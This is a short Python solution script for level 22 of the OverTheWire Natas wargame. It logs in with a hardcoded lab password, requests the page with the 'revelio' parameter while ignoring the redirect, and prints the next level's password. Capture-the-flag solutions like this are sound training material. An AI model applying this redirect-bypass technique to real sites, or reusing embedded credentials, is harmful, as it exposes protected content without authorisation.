import requests

sess = requests.Session()
sess.auth = ("natas22", "chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ")

res = sess.post(allow_redirects=False, url="http://natas22.natas.labs.overthewire.org/index.php?revelio")
for line in res.text.splitlines():
    if "Password" in line:
        print(line)

sess.close()